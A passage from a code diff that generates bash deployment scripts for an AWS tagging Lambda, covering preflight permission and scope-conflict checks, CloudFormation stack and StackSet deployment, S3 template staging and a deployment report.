+# (The ScopedAccountIds CFN parameter is a multi-account convenience filter evaluated
+# by the Lambda at runtime; single-account deploys set it to ALL and rely on the
+# Lambda's per-account identity at tag time.)
+for CHECK_REGION in \$REGIONS; do
+    EXISTING_STACKS=\$(aws cloudformation list-stacks --region "\$CHECK_REGION" \\
+        --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE UPDATE_ROLLBACK_COMPLETE \\
+        --query "StackSummaries[?starts_with(StackName, \\\`map-auto-tagger-\\\`)].StackName" \\
+        --output text 2>/dev/null || echo "")
+    LAMBDA_CONFLICT=0
+    for EXISTING in \$EXISTING_STACKS; do
+        EXISTING_MPE="\${EXISTING#map-auto-tagger-}"
+        # Only treat as a peer deploy if the suffix matches the MpeId pattern
+        # (AllowedPattern: ^mig[a-zA-Z0-9]+\$). Skips test harness / E2E stacks.
+        case "\$EXISTING_MPE" in mig*) ;; *) continue ;; esac
+        if [ "\$EXISTING_MPE" = "\$MPE" ]; then continue; fi
+        # Read peer's SSM config. Unreadable config = missing ssm:GetParameter
+        # on /auto-map-tagger/* — hard-fail with that specific remediation. The
+        # IAM preflight above should catch this first, but retain as defence.
+        EXISTING_CFG=\$(aws ssm get-parameter --name "/auto-map-tagger/\$EXISTING_MPE/config" \\
+            --region "\$CHECK_REGION" --query 'Parameter.Value' --output text 2>/dev/null || echo "")
+        if [ -z "\$EXISTING_CFG" ]; then
+            echo "  ❌ Peer stack \$EXISTING exists but /auto-map-tagger/\$EXISTING_MPE/config is unreadable."
+            echo "     Grant ssm:GetParameter on arn:aws:ssm:\$CHECK_REGION:*:parameter/auto-map-tagger/* and retry."
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} \$EXISTING config unreadable (missing ssm:GetParameter)\\n"
+            LAMBDA_CONFLICT=1
+            continue
+        fi
+        EXISTING_SCOPE_MODE=\$(echo "\$EXISTING_CFG" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("scope_mode","account"))' 2>/dev/null || echo "account")
+        EXISTING_ACCOUNTS=\$(echo "\$EXISTING_CFG" | python3 -c 'import json,sys; print(" ".join(json.load(sys.stdin).get("scoped_account_ids",["ALL"])))' 2>/dev/null || echo "ALL")
+        EXISTING_VPCS=\$(echo "\$EXISTING_CFG" | python3 -c 'import json,sys; print(" ".join(json.load(sys.stdin).get("scoped_vpc_ids",[])))' 2>/dev/null || echo "")
+        CONFLICT_REASON=""
+        if [ "\$NEW_SCOPE_MODE" = "account" ] && [ "\$EXISTING_SCOPE_MODE" = "account" ]; then
+            # Both account-scoped, same account → \$ACCOUNT is claimed by both.
+            # Runtime is_in_scope with ALL on either side dominates.
+            case " \$EXISTING_ACCOUNTS " in
+                *" ALL "*) CONFLICT_REASON="peer scope=account/ALL dominates \$ACCOUNT";;
+                *" \$ACCOUNT "*) CONFLICT_REASON="peer scope includes \$ACCOUNT";;
+            esac
+            if [ -z "\$CONFLICT_REASON" ]; then
+                # Peer targets different specific accounts — our deploy-account isn't in peer scope.
+                echo "  ✅ Peer \$EXISTING (MPE \$EXISTING_MPE, scope=account/[\$EXISTING_ACCOUNTS]) does not target \$ACCOUNT — safe"
+                continue
+            fi
+        elif [ "\$NEW_SCOPE_MODE" = "account" ] && [ "\$EXISTING_SCOPE_MODE" = "vpc" ]; then
+            # Our side claims the whole account; peer claims specific VPCs in same account.
+            # We'd tag the peer's VPC resources too. Conflict.
+            CONFLICT_REASON="our account-mode dominates peer VPC-scope on shared VPCs"
+        elif [ "\$NEW_SCOPE_MODE" = "vpc" ] && [ "\$EXISTING_SCOPE_MODE" = "account" ]; then
+            # Inverse: peer claims whole account (or our account is in their list), we claim VPCs within.
+            case " \$EXISTING_ACCOUNTS " in
+                *" ALL "*|*" \$ACCOUNT "*) CONFLICT_REASON="peer account-mode dominates our VPC-scope (\$EXISTING_ACCOUNTS)";;
+            esac
+            if [ -z "\$CONFLICT_REASON" ]; then
+                # Peer does NOT target our deploy-account → safe.
+                echo "  ✅ Peer \$EXISTING (MPE \$EXISTING_MPE, scope=account/[\$EXISTING_ACCOUNTS]) does not target \$ACCOUNT — safe"
+                continue
+            fi
+        else
+            # Both VPC-scoped — compute VPC overlap.
+            OVERLAP_VPCS=""
+            for NEW_VPC in \$NEW_VPC_LIST; do
+                for EXISTING_VPC in \$EXISTING_VPCS; do
+                    if [ "\$NEW_VPC" = "\$EXISTING_VPC" ]; then
+                        OVERLAP_VPCS="\$OVERLAP_VPCS \$NEW_VPC"
+                    fi
+                done
+            done
+            if [ -z "\$OVERLAP_VPCS" ]; then
+                echo "  ✅ Peer \$EXISTING (MPE \$EXISTING_MPE, scope=vpc/[\$EXISTING_VPCS]) disjoint from our VPC list — safe"
+                continue
+            fi
+            CONFLICT_REASON="shared VPC(s):\$OVERLAP_VPCS"
+        fi
+        echo "  ❌ ${t('d_fail_account_lambda_full')}"
+        echo "     Peer: \$EXISTING (MPE \$EXISTING_MPE, scope=\$EXISTING_SCOPE_MODE)"
+        echo "     New:  MPE \$MPE, scope=\$NEW_SCOPE_MODE"
+        echo "     Reason: \$CONFLICT_REASON"
+        echo "     ${t('d_fix_label')} ${t('d_fix_account_lambda')}"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} scope conflict with \$EXISTING: \$CONFLICT_REASON\\n"
+        LAMBDA_CONFLICT=1
+    done
+    if [ \$LAMBDA_CONFLICT -eq 1 ]; then
+        ERRORS=\$((ERRORS + 1))
+    else
+        # Only print the OK message if we actually checked something (there were existing stacks)
+        if [ -z "\$EXISTING_STACKS" ]; then
+            echo "  ✅ ${t('d_ok_account_lambda')}"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_account_lambda')}\\n"
+        fi
+    fi
+done
+
+${config.scopeMode === 'vpc' && config.scopedVpcIds && config.scopedVpcIds[0] !== 'NONE' ? `
+for CHECK_VPC in ${config.scopedVpcIds.map(v => '"' + v + '"').join(' ')}; do
+    VPC_RESULT=\$(aws ec2 describe-vpcs --vpc-ids "\$CHECK_VPC" --region "\$REGION" --query 'Vpcs[0].VpcId' --output text 2>/dev/null) || VPC_RESULT=""
+    if [ "\$VPC_RESULT" = "\$CHECK_VPC" ]; then
+        echo "  ✅ ${t('d_ok_vpc')} \$CHECK_VPC"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_vpc')} \$CHECK_VPC\\n"
+    else
+        echo "  ❌ ${t('d_fail_vpc')} \$CHECK_VPC"
+        echo "     ${t('d_fix_label')} ${t('d_fix_vpc')}"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_vpc')} \$CHECK_VPC\\n"
+        ERRORS=\$((ERRORS + 1))
+    fi
+done` : ''}
+if [ "\$ERRORS" -gt 0 ]; then
+    echo ""
+    echo "  ────────────────────────────────────────────"
+    echo "  ❌ \$ERRORS ${t('d_checks_failed')}"
+    echo "  ────────────────────────────────────────────"
+    DEPLOY_STATUS="FAILED"
+    {
+      echo "${t('r_title')}"
+      echo "========================================"
+      echo "${t('r_customer')}: \$CUSTOMER"
+      echo "${t('r_mpe')}: \$MPE"
+      echo "${t('r_region')}: \$REGION"
+      echo "${t('r_date')}: \$DEPLOY_TIME"
+      echo "${t('r_result')}: \$DEPLOY_STATUS"
+      echo ""
+      echo "${t('r_preflight')}"
+      echo "-------------------------"
+      printf '%b' "\$PREFLIGHT_LOG"
+      echo ""
+      echo "${t('r_action')}"
+      echo "  ${t('r_action_desc')}"
+      echo "  ${t('r_share_help')}"
+    } > "\$REPORT_FILE"
+    echo ""
+    echo "  📄 \$REPORT_FILE"
+    echo "     ${t('d_share_report')}"
+    exit 1
+fi
+echo ""
+echo "  ✅ ${t('d_all_passed')}"
+echo ""
+
+# ── Step 2: Deploy ───────────────────────────
+echo "${t('d_step2')}"
+echo "  ${t('d_step2_wait')}"
+echo ""
+
+TEMPLATE=\$(mktemp /tmp/map-auto-tagger-XXXX.yaml)
+cat > "\$TEMPLATE" << 'MAP_TEMPLATE_EOF'
+${tpl}
+MAP_TEMPLATE_EOF
+
+ACCT=\$(aws sts get-caller-identity --query Account --output text)
+DEPLOY_STATUS="SUCCESS"
+
+for REGION in \$REGIONS; do
+echo ""
+echo "  ── \$REGION ──────────────────────────────────"
+
+TEMPLATE_SIZE=\$(wc -c < "\$TEMPLATE")
+if [ "\$TEMPLATE_SIZE" -gt 51200 ]; then
+    BUCKET="auto-map-tagger-\${ACCT}"
+    if aws s3api head-bucket --bucket "\${BUCKET}" 2>/dev/null; then
+        ACTUAL_LOC=\$(aws s3api get-bucket-location --bucket "\${BUCKET}" --query LocationConstraint --output text 2>/dev/null)
+        [ "\$ACTUAL_LOC" = "None" ] || [ "\$ACTUAL_LOC" = "null" ] && ACTUAL_LOC="us-east-1"
+        if [ "\$ACTUAL_LOC" != "\$REGION" ]; then
+            echo "  ❌ ERROR: Staging bucket \${BUCKET} exists in \${ACTUAL_LOC}, not \${REGION}."
+            echo "     Delete the bucket or use a different account."
+            DEPLOY_STATUS="FAILED"; continue
+        fi
+    else
+        aws s3 mb "s3://\${BUCKET}" --region "\${REGION}"
+    fi
+    for i in 1 2 3 4 5; do
+        aws s3api put-public-access-block --bucket "\${BUCKET}" --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" > /dev/null 2>&1 && break
+        sleep 2
+    done
+    aws s3api put-bucket-encryption --bucket "\${BUCKET}" --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}' > /dev/null 2>&1 || true
+    BUCKET_POLICY=\$(printf '{"Version":"2012-10-17","Statement":[{"Sid":"DenyHTTP","Effect":"Deny","Principal":"*","Action":"s3:*","Resource":["arn:aws:s3:::%s","arn:aws:s3:::%s/*"],"Condition":{"Bool":{"aws:SecureTransport":"false"}}}]}' "\${BUCKET}" "\${BUCKET}")
+    aws s3api put-bucket-policy --bucket "\${BUCKET}" --policy "\${BUCKET_POLICY}" > /dev/null 2>&1 || true
+    aws s3 cp "\$TEMPLATE" "s3://\${BUCKET}/map-auto-tagger-\${MPE}.yaml" > /dev/null
+    TEMPLATE_REF="--template-url https://\${BUCKET}.s3.\${REGION}.amazonaws.com/map-auto-tagger-\${MPE}.yaml"
+else
+    TEMPLATE_REF="--template-body file://\$TEMPLATE"
+fi
+
+STACK_STATUS=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" --region "\$REGION" --query 'Stacks[0].StackStatus' --output text 2>/dev/null || echo "DOES_NOT_EXIST")
+if [ "\$STACK_STATUS" = "DOES_NOT_EXIST" ] || [ "\$STACK_STATUS" = "DELETE_COMPLETE" ] || [ "\$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
+    aws logs delete-log-group --log-group-name "/aws/lambda/map-auto-tagger-${mpe}" --region "\$REGION" 2>/dev/null || true
+    aws logs delete-log-group --log-group-name "/aws/lambda/map-auto-tagger-backfill-${mpe}" --region "\$REGION" 2>/dev/null || true
+fi
+if [ "\$STACK_STATUS" = "DOES_NOT_EXIST" ] || [ "\$STACK_STATUS" = "DELETE_COMPLETE" ]; then
+    aws cloudformation create-stack \\
+      --stack-name "\$STACK_NAME" \\
+      \$TEMPLATE_REF \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" > /dev/null
+    aws cloudformation wait stack-create-complete --stack-name "\$STACK_NAME" --region "\$REGION"
+elif [ "\$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
+    aws cloudformation delete-stack --stack-name "\$STACK_NAME" --region "\$REGION"
+    aws cloudformation wait stack-delete-complete --stack-name "\$STACK_NAME" --region "\$REGION"
+    aws cloudformation create-stack \\
+      --stack-name "\$STACK_NAME" \\
+      \$TEMPLATE_REF \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" > /dev/null
+    aws cloudformation wait stack-create-complete --stack-name "\$STACK_NAME" --region "\$REGION"
+else
+    echo "  ⚠️  Stack \$STACK_NAME already exists (status: \$STACK_STATUS)."
+    echo "     Updating in-place. Resources not in the new template will be deleted by CFN."
+    UPDATE_OUT=\$(aws cloudformation update-stack \\
+      --stack-name "\$STACK_NAME" \\
+      \$TEMPLATE_REF \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" 2>&1) || true
+    if ! echo "\$UPDATE_OUT" | grep -q "No updates are to be performed"; then
+      aws cloudformation wait stack-update-complete --stack-name "\$STACK_NAME" --region "\$REGION" 2>/dev/null || true
+    fi
+fi
+
+echo "  ✅ \$REGION"
+aws logs put-retention-policy --log-group-name "/aws/lambda/map-auto-tagger-${mpe}" --retention-in-days 90 --region "\$REGION" 2>/dev/null || true
+${config.includeBackfill ? 'aws logs put-retention-policy --log-group-name "/aws/lambda/map-auto-tagger-backfill-' + mpe + '" --retention-in-days 90 --region "$REGION" 2>/dev/null || true' : ''}
+done
+
+rm -f "\$TEMPLATE"
+REGION="${region}"
+${config.includeBackfill ? `
+# ── Backfill wait ────────────────────────────
+echo ""
+echo "${t('d_backfill_waiting')}"
+echo "  ${t('d_backfill_wait_info')}"
+echo ""
+BACKFILL_RESULT="${t('d_backfill_timeout')}"
+BACKFILL_WAIT_START_MS=\$(( \$(date +%s) * 1000 ))
+WAIT=0
+# Backfill is a Custom::Backfill CustomResource (one-shot during stack create),
+# NOT an EventBridge rule — so we poll the backfill Lambda's CloudWatch log
+# group for the "Backfill complete" sentinel. The prior version gated this on
+# 'aws events describe-rule --name map-auto-tagger-backfill-\$MPE' returning
+# DISABLED, but no such rule is ever created; every deploy silently hit the
+# 1200s timeout before the CloudWatch poll ran.
+while [ \$WAIT -lt 1200 ]; do
+  COMPLETE=\$(aws logs filter-log-events \\
+    --log-group-name "/aws/lambda/map-auto-tagger-backfill-\$MPE" \\
+    --region "\$REGION" \\
+    --filter-pattern '"Backfill complete"' \\
+    --start-time "\$BACKFILL_WAIT_START_MS" \\
+    --max-items 1 \\
+    --query 'events[0].message' \\
+    --output text 2>/dev/null)
+  if [ -n "\$COMPLETE" ] && [ "\$COMPLETE" != "None" ]; then
+    BACKFILL_RESULT="\$COMPLETE"
+    echo "  ✅ ${t('d_backfill_done')} \$BACKFILL_RESULT"
+    break
+  fi
+  sleep 30
+  WAIT=\$((WAIT + 30))
+  echo "  ${t('d_backfill_in_progress')} (\${WAIT}s)"
+done
+echo ""` : ''}
+# ── Step 3: Done ─────────────────────────────
+echo "${t('d_step3')}"
+echo ""
+
+{
+  echo "${t('r_title')}"
+  echo "========================================"
+  echo "${t('r_customer')}: \$CUSTOMER"
+  echo "${t('r_mpe')}: \$MPE"
+  echo "${t('r_region')}: \$REGION"
+  echo "${t('r_date')}: \$DEPLOY_TIME"
+  echo "${t('r_result')}: \$DEPLOY_STATUS"
+  echo ""
+  echo "${t('r_preflight')}"
+  echo "-------------------------"
+  printf '%b' "\$PREFLIGHT_LOG"
+  echo ""
+  echo "${t('r_deployed')}"
+  echo "------------------"
+  echo "  - Auto-tagger Lambda (map-auto-tagger-\$MPE)"
+  echo "  - EventBridge rule"
+  echo "  - Dead letter queue (14-day retention)"
+  echo "  - CloudWatch alarm"
+  echo "  - SSM config (/auto-map-tagger/\$MPE/config)"
+  ${config.includeBackfill ? `echo "  - Backfill Lambda"` : ''}
+  echo ""
+  echo "${t('r_verify')}"
+  echo "--------------"
+  echo "  ${t('r_verify1')}"
+  echo "  ${t('r_verify2')}"
+  echo "  ${t('r_verify3')} \$MPE"
+  echo ""
+  ${config.includeBackfill ? `echo "${t('r_backfill_result')}"
+  echo "----------------"
+  echo "  \$BACKFILL_RESULT"
+  echo ""` : ''}
+  echo "${t('r_support')}"
+  echo "--------"
+  echo "  aws logs tail /aws/lambda/map-auto-tagger-\$MPE --follow"
+  echo "  ${t('r_contact')}"
+} > "\$REPORT_FILE"
+
+echo "  ┌─────────────────────────────────────────┐"
+echo "  │   ✅ ${t('d_complete_title')}               │"
+echo "  │   ${t('d_complete_single')}  │"
+echo "  └─────────────────────────────────────────┘"
+echo ""
+echo "  📄 ${t('d_report_saved')} \$REPORT_FILE"
+echo "     ${t('d_share_report')}"
+echo ""
+`;
+            }
+
+            // Multi-account — embed both templates in the script
+            const orgTpl = escapeHeredoc(mainTemplate);
+            const accountsTpl = escapeHeredoc(perAccountTemplate || '');
+
+            return `#!/bin/bash
+# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
+# SPDX-License-Identifier: MIT-0
+#
+# MAP 2.0 Auto-Tagger — Deployment Script
+# Customer: ${customerComment} | MPE: ${mpe}
+# Run this file in AWS CloudShell (management account): bash deploy.sh
+set -e
+
+MPE="${mpe}"
+REGION="${region}"
+# Multi-account deployment is pinned to the management-account region selected
+# in the configurator. The preflight iterates over $REGIONS (plural) to align
+# with the single-account generator's loop idiom — this normalizes both paths
+# on a one-element region list.
+REGIONS="\$REGION"
+ACCOUNT=\$(aws sts get-caller-identity --query Account --output text)
+BUCKET="auto-map-tagger-\${ACCOUNT}"
+STACK_NAME="map-auto-tagger-${mpe}"
+CUSTOMER=${customerDisplay}
+REPORT_FILE="${reportFile}"
+DEPLOY_TIME=\$(date '+%Y-%m-%d %H:%M:%S')
+PREFLIGHT_LOG=""
+DEPLOY_STATUS="NOT STARTED"
+
+# ────────────────────────────────────────────
+echo ""
+echo "  ┌─────────────────────────────────────────┐"
+echo "  │   ${t('d_title')}              │"
+echo "  │   ${t('d_tag_label')}: \$MPE"
+echo "  │   ${t('d_region_label')}: \$REGION"
+echo "  │   ${t('d_account_label')}: \$ACCOUNT"
+echo "  └─────────────────────────────────────────┘"
+echo ""
+
+# ── Step 1: Pre-flight checks ────────────────
+echo "${t('d_step1')}"
+echo ""
+ERRORS=0
+
+if ! aws sts get-caller-identity > /dev/null 2>&1; then
+    echo "  ❌ ${t('d_fail_creds')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_creds')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_creds')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_creds')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_creds')}\\n"
+fi
+
+if ! aws cloudformation list-stacks --region "\$REGION" > /dev/null 2>&1; then
+    echo "  ❌ ${t('d_fail_perms')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_perms')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_perms')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_perms')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_perms')}\\n"
+fi
+
+ORG_MASTER=\$(aws organizations describe-organization --query 'Organization.MasterAccountId' --output text 2>/dev/null)
+if [ -z "\$ORG_MASTER" ]; then
+    echo "  ❌ ${t('d_fail_org')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_org')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_org')}\\n"
+    ERRORS=\$((ERRORS + 1))
+elif [ "\$ACCOUNT" = "\$ORG_MASTER" ]; then
+    echo "  ✅ ${t('d_ok_org')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_org')}\\n"
+else
+    IS_DELEGATED=\$(aws organizations list-delegated-services-for-account --account-id "\$ACCOUNT" \\
+        --query "DelegatedServices[?contains(ServicePrincipal,'stacksets.cloudformation')].ServicePrincipal" \\
+        --output text 2>/dev/null)
+    if [ -n "\$IS_DELEGATED" ]; then
+        echo "  ✅ ${t('d_ok_org_delegated')}"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_org_delegated')}\\n"
+    else
+        echo "  ❌ ${t('d_fail_org')}"
+        echo "     ${t('d_fix_label')} ${t('d_fix_org')}"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_org')}\\n"
+        ERRORS=\$((ERRORS + 1))
+    fi
+fi
+
+STACKSETS_ACCESS=\$(aws organizations list-aws-service-access-for-organization --query "EnabledServicePrincipals[?contains(ServicePrincipal,'stacksets.cloudformation')].ServicePrincipal" --output text 2>/dev/null)
+if [ -z "\$STACKSETS_ACCESS" ]; then
+    echo "  ❌ CloudFormation StackSets trusted access is not enabled in this organization."
+    echo "     → Fix: aws organizations enable-aws-service-access --service-principal member.org.stacksets.cloudformation.amazonaws.com"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}FAIL: StackSets trusted access not enabled\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_stacksets')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_stacksets')}\\n"
+fi
+
+for CHECK_REGION in ${regionArgs}; do
+    TRAIL_COUNT=\$(aws cloudtrail describe-trails --region "\$CHECK_REGION" --query 'trailList[*].TrailARN' --output text 2>/dev/null | wc -w)
+    if [ "\$TRAIL_COUNT" -eq 0 ]; then
+        echo "  ❌ ${t('d_fail_trail')} \$CHECK_REGION"
+        echo "     ${t('d_fix_label')} ${t('d_fix_trail1')}"
+        echo "            ${t('d_fix_trail2')} \$CHECK_REGION"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_trail')} \$CHECK_REGION\\n"
+        ERRORS=\$((ERRORS + 1))
+    else
+        echo "  ✅ ${t('d_ok_trail')} \$CHECK_REGION"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_trail')} \$CHECK_REGION\\n"
+    fi
+done
+
+SCP_RESULT=\$(aws iam simulate-principal-policy \\
+    --policy-source-arn "\$(aws sts get-caller-identity --query Arn --output text 2>/dev/null)" \\
+    --action-names "tag:TagResources" \\
+    --query 'EvaluationResults[0].EvalDecision' \\
+    --output text 2>/dev/null) || SCP_RESULT=""
+if [ "\$SCP_RESULT" = "explicitDeny" ]; then
+    echo "  ❌ ${t('d_fail_scp')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_scp')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_scp')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_scp')}"
+    echo "     ${t('d_scp_note')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_scp')}\\n"
+fi
+
+# ── Deploy-time IAM actions (multi-account path) ────────────────
+# Multi-account adds StackSets + Organizations actions on top of the
+# single-account set. Single batched simulate-principal-policy call.
+CALLER_ARN=\$(aws sts get-caller-identity --query Arn --output text 2>/dev/null || echo "")
+# simulate-principal-policy needs an IAM user/role ARN, NOT the assumed-role session
+# ARN returned by get-caller-identity (e.g. arn:aws:sts::...:assumed-role/Foo/session).
+# Convert assumed-role → role ARN for SSO / role callers; pass through for IAM users.
+if [[ "\$CALLER_ARN" == *":assumed-role/"* ]]; then
+    SIM_ACCT=\$(echo "\$CALLER_ARN" | cut -d: -f5)
+    SIM_ROLE=\$(echo "\$CALLER_ARN" | sed 's|.*:assumed-role/||' | cut -d/ -f1)
+    SIM_ARN="arn:aws:iam::\${SIM_ACCT}:role/\${SIM_ROLE}"
+else
+    SIM_ARN="\$CALLER_ARN"
+fi
+IAM_CHECK_ACTIONS=( \\
+  "cloudformation:CreateStack" \\
+  "cloudformation:UpdateStack" \\
+  "cloudformation:DescribeStacks" \\
+  "cloudformation:GetTemplateSummary" \\
+  "cloudformation:CreateStackSet" \\
+  "cloudformation:CreateStackInstances" \\
+  "cloudformation:DescribeStackSet" \\
+  "cloudformation:ListStacks" \\
+  "cloudformation:ListStackSets" \\
+  "cloudformation:ListStackInstances" \\
+  "organizations:ListRoots" \\
+  "organizations:DescribeOrganization" \\
+  "organizations:ListAccounts" \\
+  "iam:CreateRole" \\
+  "iam:PutRolePolicy" \\
+  "iam:AttachRolePolicy" \\
+  "iam:PassRole" \\
+  "lambda:CreateFunction" \\
+  "lambda:AddPermission" \\
+  "events:PutRule" \\
+  "events:PutTargets" \\
+  "sqs:CreateQueue" \\
+  "sqs:SetQueueAttributes" \\
+  "ssm:PutParameter" \\
+  "ssm:GetParameter" \\
+  "logs:CreateLogGroup" \\
+  "logs:PutRetentionPolicy" \\
+  "sns:CreateTopic" \\
+  "sns:Subscribe" \\
+  "s3:CreateBucket" \\
+  "s3:PutBucketPolicy" \\
+)
+if [ -n "\$SIM_ARN" ]; then
+    IAM_DENIED=\$(aws iam simulate-principal-policy \\
+        --policy-source-arn "\$SIM_ARN" \\
+        --action-names "\${IAM_CHECK_ACTIONS[@]}" \\
+        --query 'EvaluationResults[?EvalDecision != \`allowed\`].[EvalActionName,EvalDecision]' \\
+        --output text 2>/dev/null || echo "")
+    if [ -n "\$IAM_DENIED" ]; then
+        echo "  ❌ ${t('d_fail_iam')}"
+        echo "\$IAM_DENIED" | while IFS=\$'\\t' read -r action decision; do
+            echo "     - \$action → \$decision"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} IAM: \$action \$decision\\n"
+        done
+        echo "     ${t('d_fix_label')} ${t('d_fix_iam')}"
+        ERRORS=\$((ERRORS + 1))
+    else
+        echo "  ✅ ${t('d_ok_iam')} (\${#IAM_CHECK_ACTIONS[@]})"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_iam')}\\n"
+    fi
+else
+    echo "  ⚠️  ${t('d_skip_iam')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}[SKIP] ${t('d_skip_iam')}\\n"
+fi
+
+# ── Stack state ready for deploy (multi-account management account) ──
+# Only checks the management-account stack. Per-target-account StackSet
+# instances are managed by CloudFormation and don't need preflight here.
+for CHECK_REGION in \$REGIONS; do
+    PREDEPLOY_STATUS=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" \\
+        --region "\$CHECK_REGION" --query 'Stacks[0].StackStatus' --output text 2>/dev/null \\
+        || echo "NOT_FOUND")
+    case "\$PREDEPLOY_STATUS" in
+        NOT_FOUND|DELETE_COMPLETE|ROLLBACK_COMPLETE|CREATE_COMPLETE|UPDATE_COMPLETE|UPDATE_ROLLBACK_COMPLETE)
+            echo "  ✅ ${t('d_ok_stack_state')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_stack_state')} \$CHECK_REGION\\n"
+            ;;
+        *_IN_PROGRESS)
+            echo "  ❌ ${t('d_fail_stack_inprogress')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            echo "     ${t('d_fix_label')} ${t('d_fix_stack_inprogress')}"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_stack_inprogress')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ERRORS=\$((ERRORS + 1))
+            ;;
+        UPDATE_ROLLBACK_FAILED|ROLLBACK_FAILED|DELETE_FAILED)
+            echo "  ❌ ${t('d_fail_stack_stuck')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            echo "     ${t('d_fix_label')} ${t('d_fix_stack_stuck')}"
+            echo "     - UPDATE_ROLLBACK_FAILED: aws cloudformation continue-update-rollback --stack-name \$STACK_NAME --region \$CHECK_REGION"
+            echo "     - ROLLBACK_FAILED / DELETE_FAILED: delete via console (may require AWS Support)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_stack_stuck')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ERRORS=\$((ERRORS + 1))
+            ;;
+        *)
+            echo "  ⚠️  ${t('d_warn_stack_unknown')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}[WARN] ${t('d_warn_stack_unknown')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ;;
+    esac
+done
+
+# ── Cross-MPE StackSet conflict (Class 1: multi-account AutoDeployment) ──
+# Detect a customer accidentally deploying a second MAP engagement on top of
+# an existing one. If any map-auto-tagger-* StackSet in this region has a
+# different MPE and shares any account with our new target set, BOTH Lambdas
+# would tag resources and the map-migrated tag value becomes last-writer-wins.
+# Fail hard with the specific overlapping account IDs. (Layer 1 only —
+# Lambda scoped_account_ids precision requires cross-account SSM access
+# we don't have from the management account.)
+NEW_TARGET_ACCOUNTS_FILE=\$(mktemp)
+${config.useAccountScope && config.stacksetAccounts && config.stacksetAccounts.length > 0
+  ? config.stacksetAccounts.map(a => `echo "${a.id}" >> "\\$NEW_TARGET_ACCOUNTS_FILE"`).join('\n')
+  : `# ALL accounts in org
+aws organizations list-accounts --query 'Accounts[?Status==\`ACTIVE\`].Id' --output text 2>/dev/null | tr '\\\\t' '\\\\n' > "\\$NEW_TARGET_ACCOUNTS_FILE" || true`}
+
+COMPETING_STACKSETS=\$(aws cloudformation list-stack-sets --status ACTIVE --region "\$REGION" \\
+    --query "Summaries[?starts_with(StackSetName, \\\`map-auto-tagger-\\\`)].StackSetName" \\
+    --output text 2>/dev/null || echo "")
+
+CONFLICTS_FOUND=0
+for SS in \$COMPETING_STACKSETS; do
+    SS_MPE="\${SS#map-auto-tagger-}"
+    # Only treat as a peer deploy if the suffix matches the MpeId pattern
